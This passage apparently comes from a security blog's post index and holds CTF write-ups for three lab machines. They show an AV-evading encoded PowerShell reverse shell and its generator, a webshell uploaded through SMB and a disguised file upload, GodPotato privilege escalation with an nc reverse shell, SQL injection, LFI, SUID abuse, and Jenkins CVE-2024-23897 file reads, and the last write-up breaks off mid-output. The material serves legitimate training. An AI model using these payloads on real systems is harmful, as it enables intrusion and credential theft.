data connection.100% |*****************************************************************************| 173 0.22 KiB/s 00:00 ETA226 Transfer complete.173 bytes received in 00:00 (0.22 KiB/s)ftp> exit221 Goodbye.```{: .nolineno}## Web Enumeration â¤µï¸I opened the `notice.txt` file and here is some hints ->```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/AllSignPoint2Pwnage]â””â”€$ cat notice.txt NOTICE======Due to customer complaints about using FTP we have now moved 'images' to a hidden windows file share for upload and management of images.- Dev Team ```{: .nolineno}Lets do some digging into the SMB Shares and I got these shares which are hidden ->```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/AllSignPoint2Pwnage]â””â”€$ smbclient -L ////10.10.84.25//Password for [WORKGROUP\\kali]:\tSharename Type Comment\t--------- ---- -------\tADMIN$ Disk Remote Admin\tC$ Disk Default share\timages$ Disk \tInstalls$ Disk \tIPC$ IPC Remote IPC\tUsers Disk ```{: .nolineno}I then accessed the images$ share and got these images that images can be found from the web also like this ->![Image](Pasted%20image%2020240221213109.png)_The site has a directory that is connected to SMB shares_SMB Shares look like this , so I put the `webshell.php` file into it ->```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/AllSignPoint2Pwnage]â””â”€$ smbclient //10.10.84.25/images$ Password for [WORKGROUP\\kali]:Try \"help\" to get a list of possible commands.smb: \\> ls -alNT_STATUS_NO_SUCH_FILE listing \\-alsmb: \\> ls . D 0 Wed Feb 21 20:33:23 2024 .. D 0 Wed Feb 21 20:33:23 2024 internet-1028794_1920.jpg A 134193 Mon Jan 11 03:22:24 2021 man-1459246_1280.png A 363259 Mon Jan 11 03:20:49 2021 monitor-1307227_1920.jpg A 691570 Mon Jan 11 03:20:29 2021 neon-sign-4716257_1920.png A 1461192 Mon Jan 11 03:23:59 2021 webshell.php A 20320 Wed Feb 21 20:33:24 2024\t\t10861311 blocks of size 4096. 4124853 blocks availablesmb: \\> ```{: .nolineno}Now lets access the webshell from the site , I then performed the reverse shell command through this script file ->![Image](Pasted%20image%2020240221213421.png)_Webshell file_The script is this that help me to evade Antivirus or Defender and generate a powershell payload in encrypted format like this ðŸ”»```pythonâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/AllSignPoint2Pwnage]â””â”€$ cat payload.py #!/usr/bin/env python {payload.py}import base64import sysif len(sys.argv) &1 | Out-String ); $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> '); $s.Write($sb,0,$sb.Length); $s.Flush()};$c.Close()\"\"\" % (sys.argv[1], sys.argv[2])byte = payload.encode('utf-16-le')b64 = base64.b64encode(byte)print(\"powershell -exec bypass -enc %s\" % b64.decode())```{: .nolineno}{: file=payload.py}```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/AllSignPoint2Pwnage]â””â”€$ python3 payload.py 10.14.72.139 4444powershell -exec bypass -enc CgAkAGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAMAAuADEANAAuADcAMgAuADEAMwA5ACcALAA0ADQANAA0ACkAOwAKACQAcwAgAD0AIAAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwAKAHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwAuAFIAZQBhAGQAKAAkAGIALAAgADAALAAgACQAYgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsACgAgACAAIAAgACQAZAAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACAAJABpACkAOwAKACAAIAAgACAAJABzAGIAIAA9ACAAKABpAGUAeAAgACQAZAAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAKACAAIAAgACAAJABzAGIAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAgACsAIAAnAHAAcwA+ACAAJwApADsACgAgACAAIAAgACQAcwAuAFcAcgBpAHQAZQAoACQAcwBiACwAMAAsACQAcwBiAC4ATABlAG4AZwB0AGgAKQA7AAoAIAAgACAAIAAkAHMALgBGAGwAdQBzAGgAKAApAAoAfQA7AAoAJABjAC4AQwBsAG8AcwBlACgAKQAKAA==```{: .nolineno}Now lets have a shell ->![Image](Pasted%20image%2020240221213749.png)```powershellâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/AllSignPoint2Pwnage]â””â”€$ rlwrap nc -lvnp 4444 listening on [any] 4444 ...connect to [10.14.72.139] from (UNKNOWN) [10.10.84.25] 49744ps> whoamidesktop-997gg7d\\signps> pwdPath ---- C:\\xampp\\htdocs\\imagesps> hostnameDESKTOP-997GG7Dps>ps> dir C:\\Users Directory: C:\\UsersMode LastWriteTime Length Name ---- ------------- ------ ---- d----- 14/11/2020 14:11 Administrator d-r--- 14/11/2020 13:14 Public d----- 26/01/2021 18:19 sign ps> dir signps> tree /f /aFolder PATH listingVolume serial number is 481F-824BC:.+---3D Objects+---Contacts+---Desktop| Microsoft Edge.lnk| user_flag.txt| +---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---OneDrive+---Pictures| +---Camera Roll| \\---Saved Pictures+---Saved Games+---Searches| winrt--{S-1-5-21-201290883-77286733-747258586-1001}-.searchconnector-ms| \\---Videosps>```{: .nolineno}I checked the privileges this user has and I got this ->```powershellps> whoami /allUSER INFORMATION----------------User Name SID ==================== ===================================desktop-997gg7d\\sign S-1-5-21-201290883-77286733-747258586-1001GROUP INFORMATION-----------------Group Name Type SID Attributes ==================================== ================ ============ ===========================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\SERVICE Well-known group S-1-5-6 Mandatory group, Enabled by default, Enabled groupCONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled groupLOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled groupMandatory Label\\High Mandatory Level Label S-1-16-12288 PRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ========================================= =SeShutdownPrivilege Shut down the system DisabledSeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station DisabledSeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set DisabledSeTimeZonePrivilege Change the time zone Disabledps>```{: .nolineno}So this user have SeImpersonatePrivilege Enabled so lets use that privilege to escalate to Administraotor user.I will be using God Potato Tool to perform this attack ->```powershellps> wget http://10.14.72.139/GodPotato-NET4.exe -o GodPotato-NET4.exeps> .\\GodPotato-NET4.exe -cmd \"cmd /c whoami\"[*] CombaseModule: 0x140710263586816[*] DispatchTable: 0x140710265929424[*] UseProtseqFunction: 0x140710265298800[*] UseProtseqFunctionParamCount: 6[*] HookRPC[*] Start PipeServer[*] CreateNamedPipe \\\\.\\pipe\\e8a23d97-8087-4374-9781-a5fe212e83b1\\pipe\\epmapper[*] Trigger RPCSS[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046[*] DCOM obj IPID: 0000e402-14ac-ffff-b282-1cd79fc647f8[*] DCOM obj OXID: 0x60bf2126560bd17[*] DCOM obj OID: 0x8b21d7be65d54b38[*] DCOM obj Flags: 0x281[*] DCOM obj PublicRefs: 0x0[*] Marshal Object bytes len: 100[*] UnMarshal Object[*] Pipe Connected![*] CurrentUser: NT AUTHORITY\\NETWORK SERVICE[*] CurrentsImpersonationLevel: Impersonation[*] Start Search System Token[*] PID : 1000 Token:0x448 User: NT AUTHORITY\\SYSTEM ImpersonationLevel: Impersonation[*] Find System Token : True[*] UnmarshalObject: 0x80070776[*] CurrentUser: NT AUTHORITY\\SYSTEM[*] process start with pid 2136ps>```{: .nolineno}It is working fine so lets have a reverse shell of `NT AUTHORITY\\SYSTEM` user ->```powershellps> .\\GodPotato-NET4.exe -cmd \"cmd /c C:\\Users\\sign\\nc64.exe 10.14.72.139 2222 -e cmd\"[*] CombaseModule: 0x140710263586816[*] DispatchTable: 0x140710265929424[*] UseProtseqFunction: 0x140710265298800[*] UseProtseqFunctionParamCount: 6[*] HookRPC[*] Start PipeServer[*] CreateNamedPipe \\\\.\\pipe\\8db06d03-3792-43fc-8109-9b7471bf9829\\pipe\\epmapper[*] Trigger RPCSS[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046[*] DCOM obj IPID: 00003802-19c4-ffff-dbbc-7b34cbc38088[*] DCOM obj OXID: 0x3a11402b203ad703[*] DCOM obj OID: 0xf0773c40263c446c[*] DCOM obj Flags: 0x281[*] DCOM obj PublicRefs: 0x0[*] Marshal Object bytes len: 100[*] UnMarshal Object[*] Pipe Connected![*] CurrentUser: NT AUTHORITY\\NETWORK SERVICE[*] CurrentsImpersonationLevel: Impersonation[*] Start Search System Token[*] PID : 1000 Token:0x448 User: NT AUTHORITY\\SYSTEM ImpersonationLevel: Impersonation[*] Find System Token : True[*] UnmarshalObject: 0x80070776[*] CurrentUser: NT AUTHORITY\\SYSTEM[*] process start with pid 6660ps>```{: .nolineno}In the netcat listener I got the reverse shell captured like this but the AV or Defender does not allow me to execute `whoami` command ->```powershellâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/AllSignPoint2Pwnage]â””â”€$ rlwrap nc -lvnp 2222 listening on [any] 2222 ...connect to [10.14.72.139] from (UNKNOWN) [10.10.84.25] 49880Microsoft Windows [Version 10.0.18362.1256](c) 2019 Microsoft Corporation. All rights reserved.C:\\Windows\\system32>whoamiwhoamiC:\\Windows\\system32>echo %username%echo %username%DESKTOP-997GG7D$C:\\Windows\\system32>C:\\Windows\\system32>cd C:\\Userscd C:\\UsersC:\\Users>dirdir Volume in drive C has no label. Volume Serial Number is 481F-824B Directory of C:\\Users11/14/2020 03:35 PM .11/14/2020 03:35 PM ..11/14/2020 02:11 PM Administrator11/14/2020 01:14 PM Public02/21/2024 03:30 PM sign 0 File(s) 0 bytes 5 Dir(s) 16,888,754,176 bytes freeC:\\Users>cd Administratorcd AdministratorC:\\Users\\Administrator>C:\\Users\\Administrator>tree /f /atree /f /aFolder PATH listingVolume serial number is 481F-824BC:.+---Desktop| admin_flag.txt| +---Documents+---Downloads+---Favorites+---Links+---Music+---Pictures+---Saved Games\\---VideosC:\\Users\\Administrator>type Desktop\\admin_flag.txttype Desktop\\admin_flag.txtthm{FLAG_FLAG_FLAG_FLAG_FLAG}C:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Expose", "url": "/posts/Expose/", "categories": "TryHackMe", "tags": "PrivEsc, SUIDs, sqlmap, LFI", "date": "2024-02-20 00:00:00 +0530", "snippet": "**Machine Link : https://tryhackme.com/room/expose**## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/Expose]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.2.163 -PnNmap...", "content": "**Machine Link : https://tryhackme.com/room/expose**## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/Expose]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.2.163 -PnNmap scan report for 10.10.2.163Host is up (0.18s latency).Not shown: 65530 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.0.8 or later| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.14.72.139| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 3| vsFTPd 3.0.3 - secure, fast, stable|_End of status|_ftp-anon: Anonymous FTP login allowed (FTP code 230)22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 e1:5a:40:f7:f6:d8:a1:44:16:88:53:97:5a:72:60:80 (RSA)| 256 93:a8:27:66:8d:74:0c:c9:37:cf:a0:12:98:fc:71:f3 (ECDSA)|_ 256 7e:91:0d:01:77:c2:f9:88:35:f9:1a:af:6a:d9:ca:1f (ED25519)53/tcp open domain ISC BIND 9.16.1 (Ubuntu Linux)| dns-nsid: |_ bind.version: 9.16.1-Ubuntu1337/tcp open http Apache httpd 2.4.41|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: EXPOSED1883/tcp open mosquitto version 1.6.9| mqtt-subscribe: | Topics and their most recent payloads: | $SYS/broker/load/bytes/sent/15min: 37.21| $SYS/broker/bytes/received: 780| $SYS/broker/clients/connected: 1| $SYS/broker/load/messages/received/15min: 0.68| $SYS/broker/messages/sent: 16| $SYS/broker/load/sockets/1min: 1.21| $SYS/broker/clients/maximum: 1| $SYS/broker/publish/bytes/sent: 82| $SYS/broker/load/publish/sent/15min: 0.86| $SYS/broker/messages/received: 13| $SYS/broker/load/connections/1min: 1.09| $SYS/broker/load/connections/5min: 0.34| $SYS/broker/load/publish/sent/1min: 11.88| $SYS/broker/retained messages/count: 31| $SYS/broker/load/connections/15min: 0.13| $SYS/broker/load/messages/received/1min: 2.11| $SYS/broker/load/messages/sent/1min: 13.88| $SYS/broker/load/messages/received/5min: 1.33| $SYS/broker/load/bytes/received/1min: 57.07| $SYS/broker/store/messages/bytes: 137| $SYS/broker/load/bytes/sent/1min: 510.54| $SYS/broker/heap/maximum: 51024| $SYS/broker/load/messages/sent/5min: 3.09| $SYS/broker/clients/active: 1| $SYS/broker/messages/stored: 27| $SYS/broker/publish/messages/sent: 13| $SYS/broker/clients/total: 1| $SYS/broker/version: mosquitto version 1.6.9| $SYS/broker/load/bytes/received/15min: 39.37| $SYS/broker/load/bytes/received/5min: 69.44| $SYS/broker/store/messages/count: 27| $SYS/broker/load/bytes/sent/5min: 110.14| $SYS/broker/bytes/sent: 562| $SYS/broker/subscriptions/count: 2| $SYS/broker/heap/current: 50544| $SYS/broker/uptime: 1221 seconds| $SYS/broker/load/messages/sent/15min: 1.05| $SYS/broker/load/publish/sent/5min: 2.55| $SYS/broker/load/sockets/15min: 0.73|_ $SYS/broker/load/sockets/5min: 1.28Service Info: Host: ip-10-10-2-163.eu-west-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸I inspected port 1337 which is http server so I did some directory or files bruteforcing and got this ->![Image](Pasted%20image%2020240221121425.png)I got this from directory fuzzing ->Through SQLi with sqlmap I got this vulnerability here ->![Image](Pasted%20image%2020240220233850.png)_Vulnerable to SQLi enumerated through sqlmap Tool_I got data from expose database that is ->![Image](Pasted%20image%2020240221114006.png)_Credentials for admin_101 directory_Also I got another table data that is `config` ->![Image](Pasted%20image%2020240221114207.png)_Another Creds for further usage_I checked this `/file1010111/index.php` directory that asks for the password and I entered the password as `easytohack` to access the site . ![Image](Pasted%20image%2020240221002005.png)_Dashboard of /file1010111/ directory_After submitting the password I got this page which states me to perform parameter fuzzing so I did with the help of burpsuite and used the value as `../../../../../etc/passwd` so that I could capture some output ->![Image](Pasted%20image%2020240221001932.png)I started fuzzing for the parameters and got this ->![Image](Pasted%20image%2020240221000720.png)_file parameter name is the one_So I found LFI here lets see some other files ðŸ¤”I also noticed this directory while got from enumeration process `/upload-cv00101011/index.php` lets see ->![Image](Pasted%20image%2020240221115040.png)This site is asking for password which is a username for this machine whose username starts with z so I checked the output of /etc/passwd and entered it and got inside this page ðŸ”½ ![Image](Pasted%20image%2020240221115320.png)_File Upload page_Now I have to upload a file but that file should be `.png` format to make it upload otherwise the site does not response so.![Image](Pasted%20image%2020240221120208.png)_Captured the request with burpsuite Tool_I uploaded the webshell file by changing it to `.png` in extension when I capture the request in burpsuite I changed the file name to `.phar` then and forwarded the request and the file uploaded successfully ->![Image](Pasted%20image%2020240221001907.png)_Webshell file uploaded successfully ðŸ˜‰_Now I have to check the uploaded forldername for that the webpage states that I should check the source code and I did ->![Image](Pasted%20image%2020240221001848.png)_/upload_thm_1001/ folder_So lets access our Web shell now ðŸ”»![Image](Pasted%20image%2020240221001803.png)_Webshell.php file that works with webshell.phar also_got the proper shell ->```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/Expose]â””â”€$ rlwrap nc -lvnp 4444 listening on [any] 4444 ...connect to [10.14.72.139] from (UNKNOWN) [10.10.2.163] 41642bash: cannot set terminal process group (779): Inappropriate ioctl for devicebash: no job control in this shellwww-data@ip-10-10-2-163:/var/www/html/upload-cv00101011/upload_thwww-data@ip-10-10-2-163:/var/www/html/upload-cv00101011/upload_thm_1001$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@ip-10-10-230-123:/home/zeamkish$ ```{: .nolineno}I switched the user now ->```bashwww-data@ip-10-10-230-123:/home/zeamkish$ su zeamkishsu zeamkishPassword: zeamkish@ip-10-10-230-123:~$ whoami whoamizeamkishzeamkish@ip-10-10-230-123:~$ ididuid=1001(zeamkish) gid=1001(zeamkish) groups=1001(zeamkish)zeamkish@ip-10-10-230-123:~$ sudo -l sudo -l[sudo] password for zeamkish: Sorry, user zeamkish may not run sudo on ip-10-10-230-123.zeamkish@ip-10-10-230-123:~$ find / -perm -u=s -type f 2>/find / -perm -u=s -type f 2>/dev/nullfind / -perm -u=s -type f 2>/dev/null/snap/core20/1974/usr/bin/chfn/snap/core20/1974/usr/bin/chsh/snap/core20/1974/usr/bin/gpasswd/snap/core20/1974/usr/bin/mount/snap/core20/1974/usr/bin/newgrp/snap/core20/1974/usr/bin/passwd/snap/core20/1974/usr/bin/su/snap/core20/1974/usr/bin/sudo/snap/core20/1974/usr/bin/umount/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core20/1974/usr/lib/openssh/ssh-keysign/snap/core20/1950/usr/bin/chfn/snap/core20/1950/usr/bin/chsh/snap/core20/1950/usr/bin/gpasswd/snap/core20/1950/usr/bin/mount/snap/core20/1950/usr/bin/newgrp/snap/core20/1950/usr/bin/passwd/snap/core20/1950/usr/bin/su/snap/core20/1950/usr/bin/sudo/snap/core20/1950/usr/bin/umount/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core20/1950/usr/lib/openssh/ssh-keysign/snap/core/15511/bin/mount/snap/core/15511/bin/ping/snap/core/15511/bin/ping6/snap/core/15511/bin/su/snap/core/15511/bin/umount/snap/core/15511/usr/bin/chfn/snap/core/15511/usr/bin/chsh/snap/core/15511/usr/bin/gpasswd/snap/core/15511/usr/bin/newgrp/snap/core/15511/usr/bin/passwd/snap/core/15511/usr/bin/sudo/snap/core/15511/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core/15511/usr/lib/openssh/ssh-keysign/snap/core/15511/usr/lib/snapd/snap-confine/snap/core/15511/usr/sbin/pppd/snap/core/15419/bin/mount/snap/core/15419/bin/ping/snap/core/15419/bin/ping6/snap/core/15419/bin/su/snap/core/15419/bin/umount/snap/core/15419/usr/bin/chfn/snap/core/15419/usr/bin/chsh/snap/core/15419/usr/bin/gpasswd/snap/core/15419/usr/bin/newgrp/snap/core/15419/usr/bin/passwd/snap/core/15419/usr/bin/sudo/snap/core/15419/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core/15419/usr/lib/openssh/ssh-keysign/snap/core/15419/usr/lib/snapd/snap-confine/snap/core/15419/usr/sbin/pppd/snap/core18/2785/bin/mount/snap/core18/2785/bin/ping/snap/core18/2785/bin/su/snap/core18/2785/bin/umount/snap/core18/2785/usr/bin/chfn/snap/core18/2785/usr/bin/chsh/snap/core18/2785/usr/bin/gpasswd/snap/core18/2785/usr/bin/newgrp/snap/core18/2785/usr/bin/passwd/snap/core18/2785/usr/bin/sudo/snap/core18/2785/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core18/2785/usr/lib/openssh/ssh-keysign/snap/core18/2751/bin/mount/snap/core18/2751/bin/ping/snap/core18/2751/bin/su/snap/core18/2751/bin/umount/snap/core18/2751/usr/bin/chfn/snap/core18/2751/usr/bin/chsh/snap/core18/2751/usr/bin/gpasswd/snap/core18/2751/usr/bin/newgrp/snap/core18/2751/usr/bin/passwd/snap/core18/2751/usr/bin/sudo/snap/core18/2751/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core18/2751/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/eject/dmcrypt-get-device/usr/lib/snapd/snap-confine/usr/bin/chfn/usr/bin/pkexec/usr/bin/sudo/usr/bin/umount/usr/bin/passwd/usr/bin/gpasswd/usr/bin/newgrp/usr/bin/chsh/usr/bin/nano/usr/bin/su/usr/bin/fusermount/usr/bin/find/usr/bin/at/usr/bin/mountzeamkish@ip-10-10-230-123:~$ ```{: .nolineno}while checking SUIDs I got 2,3 programs that can escalate me to root so I will be using `find` command to get the root ->```bashzeamkish@ip-10-10-230-123:~$ find . -exec /bin/bash -p \\; find . -exec /bin/bash -p \\; -quitfind . -exec /bin/bash -p \\; -quitbash-5.0# whoamiwhoamirootbash-5.0# ididuid=1001(zeamkish) gid=1001(zeamkish) euid=0(root) groups=1001(zeamkish)bash-5.0# cd /rootcd /rootbash-5.0# ls -alls -altotal 40drwx------ 5 root root 4096 Jun 11 2023 .drwxr-xr-x 20 root root 4096 Feb 21 06:06 ..-rw------- 1 root root 330 Jun 30 2023 .bash_history-rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrcdrwxr-xr-x 3 root root 4096 Jun 2 2023 .local-rw------- 1 root root 13 May 25 2023 .mysql_history-rw-r--r-- 1 root root 161 Dec 5 2019 .profiledrwx------ 2 root root 4096 May 25 2023 .ssh-rw-r--r-- 1 root root 23 Jun 11 2023 flag.txtdrwxr-xr-x 4 root root 4096 May 25 2023 snapbash-5.0# ```{: .nolineno}I checked the ID and this user zeamkish got effective user ID to root and now this user can act as root user .I am root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Builder", "url": "/posts/Builder/", "categories": "HackTheBox", "tags": "CMS, Jenkins, Public Exploit, PrivEsc", "date": "2024-02-14 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Builder]â””â”€$ nmap -sC -sV -T4 -p- -oN Nmap_Results.txt -Pn 10.10.11.10PORT STATE SERVICE VERSION22/tcp open ssh OpenS...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Builder]â””â”€$ nmap -sC -sV -T4 -p- -oN Nmap_Results.txt -Pn 10.10.11.10PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)8080/tcp open http-proxy?Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸I enumerated on port 8080 and discovered a Jenkins site running version 2.441, which is vulnerable to **CVE-2024-23897**.I found a detailed proof-of-concept [here](https://medium.com/@red_darkin/how-to-replicate-jenkins-cve-2024-23897-arbitrary-file-read-vulnerability-260c8174dd94).So lets download the CLI client.![Image](Pasted%20image%2020240214110714.png)_CLI Client_Here's a snapshot:![900](Pasted%20image%2020240214110138.png)To execute the exploit, use the following Java command:```jenkinsjava -jar jenkins-cli.jar [-s JENKINS_URL] [global options...] command [command options...] [arguments...]```{: .nolineno}when looking for global options I typed help and got a bunch of options like this â–¶ï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Builder]â””â”€$ java -jar jenkins-cli.jar -s http://10.10.11.10:8080 help Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true add-job-to-view Adds jobs to view. build Builds a job, and optionally waits until its completion. cancel-quiet-down Cancel the effect of the \"quiet-down\" command. clear-queue Clears the build queue. connect-node Reconnect to a node(s) console Retrieves console output of a build. copy-job Copies a job. create-credentials-by-xml Create Credential by XML create-credentials-domain-by-xml Create Credentials Domain by XML```{: .nolineno}I utilized the **connect-node** global option, as it provides more output lines compared to others:```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Builder]â””â”€$ java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node '@/etc/passwd'Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=truewww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin: No such agent \"www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\" exists.root:x:0:0:root:/root:/bin/bash: No such agent \"root:x:0:0:root:/root:/bin/bash\" exists.mail:x:8:8:mail:/var/mail:/usr/sbin/nologin: No such agent \"mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\" exists.backup:x:34:34:backup:/var/backups:/usr/sbin/nologin: No such agent \"backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\" exists._apt:x:42:65534::/nonexistent:/usr/sbin/nologin: No such agent \"_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\" exists.nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin: No such agent \"nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\" exists.lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin: No such agent \"lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\" exists.uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin: No such agent \"uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\" exists.bin:x:2:2:bin:/bin:/usr/sbin/nologin: No such agent \"bin:x:2:2:bin:/bin:/usr/sbin/nologin\" exists.news:x:9:9:news:/var/spool/news:/usr/sbin/nologin: No such agent \"news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\" exists.proxy:x:13:13:proxy:/bin:/usr/sbin/nologin: No such agent \"proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\" exists.irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin: No such agent \"irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\" exists.list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin: No such agent \"list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\" exists.jenkins:x:1000:1000::/var/jenkins_home:/bin/bash: No such agent \"jenkins:x:1000:1000::/var/jenkins_home:/bin/bash\" exists.games:x:5:60:games:/usr/games:/usr/sbin/nologin: No such agent \"games:x:5:60:games:/usr/games:/usr/sbin/nologin\" exists.man:x:6:12:man:/var/cache/man:/usr/sbin/nologin: No such agent \"man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\" exists.daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin: No such agent \"daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\" exists.sys:x:3:3:sys:/dev:/usr/sbin/nologin: No such agent \"sys:x:3:3:sys:/dev:/usr/sbin/nologin\" exists.sync:x:4:65534:sync:/bin:/bin/sync: No such agent \"sync:x:4:65534:sync:/bin:/bin/sync\" exists.ERROR: Error occurred while performing this command, see previous stderr output.```{: .nolineno}This revealed several system accounts, including `www-data`, `root`, `mail`, etc.Now as I can read the files so lets access some internal and important files from jenkins file system ->![Image](Pasted%20image%2020240214111804.png)_Checking Environment variables and there values._```bashHOME=/var/jenkins_home```{: .nolineno}So the jenkins file system can be accessed from `HOME=/var/jenkins_home` here so lets see ->### Password Extraction â¤µï¸I then accessed the Jenkins directory and extracted the username `jennifer_12108429903186576833` from the **users.xml** file.![Image](Pasted%20image%2020240214142748.png)_users.xml file that contains the username of Jenkins._Lets access the password which basically saved in this location : `/var/jenkins_home/users//config.xml`Next, I retrieved the hashed password from the **config.xml** file:```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Builder]â””â”€$ java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node '@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml'.........: No such agent \"\" exists. jennifer: No such agent \" jennifer\" exists. 6841d11dc1de101d: No such agent \" 6841d11dc1de101d\" exists. jennifer: No such agent 